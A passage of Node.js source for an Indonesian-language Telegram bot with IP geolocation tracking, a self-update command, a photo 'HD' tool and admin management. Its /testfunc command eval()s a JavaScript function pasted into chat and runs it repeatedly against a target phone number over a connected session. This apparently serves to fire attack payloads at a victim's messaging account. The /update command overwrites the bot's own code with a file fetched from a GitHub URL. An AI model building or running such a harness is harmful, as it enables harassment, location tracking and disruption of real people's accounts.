      return bot.sendMessage(chatId, `❌ Gagal menemukan informasi untuk IP *${targetIP}*`, {
        parse_mode: "Markdown",
      });
    }

    // Format hasil
    const info = `
*📡 Informasi IP*
• IP: ${res.ip || "N/A"}
• Type: ${res.type || "N/A"}
• Country: ${res.country || "N/A"} ${res.flag?.emoji || ""}
• Region: ${res.region || "N/A"}
• City: ${res.city || "N/A"}
• Latitude: ${res.latitude || "N/A"}
• Longitude: ${res.longitude || "N/A"}
• ISP: ${res.connection?.isp || "N/A"}
• Org: ${res.connection?.org || "N/A"}
• Domain: ${res.connection?.domain || "N/A"}
• Timezone: ${res.timezone?.id || "N/A"}
• Local Time: ${res.timezone?.current_time || "N/A"}
`;

    if (res.latitude && res.longitude) {
      await bot.sendLocation(chatId, res.latitude, res.longitude);
    }

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("TrackIP Error:", err);
    bot.sendMessage(chatId, `❌ Error: Tidak dapat mengambil data IP.`, {
      parse_mode: "Markdown",
    });
  }
});

bot.onText(/\/update/, async (msg) => {
  const chatId = msg.chat.id
  const repoRaw =
    "https://raw.githubusercontent.com/muhammadradityaarkan593-pixel/Kanzzz69955/main/index.js"

  await bot.sendMessage(
    chatId,
`╔══════════════════════════════╗
║   🔄 SYSTEM UPDATE CENTER   ║
╚══════════════════════════════╝
⏳ Menghubungi server pusat...`
  )

  try {
    const { data: remoteData } = await axios.get(repoRaw)

    if (!remoteData) {
      return bot.sendMessage(
        chatId,
        "❌ **UPDATE GAGAL**\nFile update kosong."
      )
    }

    const remoteHash = crypto
      .createHash("sha256")
      .update(remoteData)
      .digest("hex")

    if (fs.existsSync("./index.js")) {
      const localData = fs.readFileSync("./index.js", "utf-8")
      const localHash = crypto
        .createHash("sha256")
        .update(localData)
        .digest("hex")

      if (remoteHash === localHash) {
        return bot.sendMessage(
          chatId,
`╔══════════════════════════════╗
║      🟡 UPDATE STATUS       ║
╚══════════════════════════════╝
❌ Tidak ada update baru
📡 Server pusat masih versi terbaru`
        )
      }
    }

    fs.writeFileSync("./index.js", remoteData)

    await bot.sendMessage(
      chatId,
`╔══════════════════════════════╗
║      🟢 UPDATE BERHASIL     ║
╚══════════════════════════════╝
✅ File berhasil diperbarui
🔄 Sistem akan direstart`
    )

    process.exit(0)
  } catch (err) {
    console.error(err)
    bot.sendMessage(
      chatId,
`╔══════════════════════════════╗
║      🔴 UPDATE ERROR        ║
╚══════════════════════════════╝
❌ Gagal terhubung ke server pusat
🌐 Periksa repo GitHub`
    )
  }
})

bot.onText(/^\/hd$/, async (msg) => {
  const chatId = msg.chat.id;

  // HARUS reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "⚠️ Reply foto dulu baru ketik /hd cok."
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Lagi ng-HD foto lu bre...");

    // Ambil foto resolusi tertinggi
    const photo = msg.reply_to_message.photo.pop();
    const file = await bot.getFile(photo.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto dari Telegram
    const dl = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(dl.data);

    // Upload ke tmpfiles
    const FormData = require("form-data");
    const form = new FormData();
    form.append("file", buffer, "image.jpg");

    const upload = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });

    const link = upload.data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");

    // API HD
    const hd = await axios.get(
      `https://api.nekolabs.web.id/tools/pxpic/restore?imageUrl=${encodeURIComponent(link)}`
    );

    if (!hd.data.success) {
      throw new Error("Gagal HD cok.");
    }

    const result = hd.data.result;

    // Kirim hasil HD
    await bot.sendPhoto(chatId, result, {
      caption: `✅ Foto berhasil di-HD cok!\n${result}`,
      parse_mode: "HTML",
    });

  } catch (err) {
    console.error("HD ERROR:", err);
    bot.sendMessage(chatId, "❌ Error cok, fotonya ga bisa di-HD.");
  }
});

bot.on('message', async (msg) => {
    if (!msg.text) return;
    if (!msg.text.startsWith('/testfunc')) return;

    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // 🔐 CEK OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // 🔌 CEK SESSION / SOCKET
    if (!sock) {
        await bot.sendMessage(
            chatId,
            '[ ! ] Session belum terhubung, connect dulu'
        );
        return;
    }

    // 📩 HARUS REPLY KE FUNCTION
    if (!msg.reply_to_message) {
        await bot.sendMessage(
            chatId,
            `[ $ ] Please reply to a message containing a *JavaScript function*\n\nExample:\nreply -> async function test(bot, target, ctx){...}\n/testfunc 628xxxx,1`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // 📌 PARSE ARGUMENT
    const q = msg.text.split(' ').slice(1).join(' ');
    if (!q) {
        await bot.sendMessage(
            chatId,
            `⁉️ Missing format.\n\nExample:\n/testfunc 628xxxx,5`
        );
        return;
    }

    let [rawTarget, rawLoop] = q.split(',');
    const number = (rawTarget || '').replace(/[^0-9]/g, '');

    if (!number) {
        await bot.sendMessage(chatId, '[ $ ] Invalid target number');
        return;
    }

    const loop = Number(rawLoop) || 1;
    const target = number;

    // 📦 AMBIL FUNCTION CODE
    const funcCode =
        msg.reply_to_message.text ||
        msg.reply_to_message.caption ||
        '';

    if (!funcCode.includes('function')) {
        await bot.sendMessage(chatId, '[ $ ] Replied message is not a function');
        return;
    }

    // 🧠 PARSE FUNCTION
    let fn;
    try {
        fn = eval(`(${funcCode})`);
    } catch (e) {
        await bot.sendMessage(
            chatId,
            `[ $ ] Parse error:\n${e.message}`
        );
        return;
    }

    // 🧩 CONTEXT
    const context = {
        sendMessage: async (chatId, text, opts = {}) => {
            return bot.sendMessage(chatId, text, opts);
        }
    };

    // ▶️ EXEC INFO
    await bot.sendMessage(
        chatId,
        `[ # ] *TESFUNC EXECUTION*\n\n$ Target : ${number}\n$ Loop   : ${loop}x`,
        { parse_mode: 'Markdown' }
    );

    // 🔁 EXEC LOOP
    for (let i = 0; i < loop; i++) {
        try {
            await fn(bot, target, context);
        } catch (e) {
            console.log('[TESFUNC ERROR]', e);
        }
    }

    await bot.sendMessage(chatId, '[ ! ] Done');
});

//END MD MENU
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});
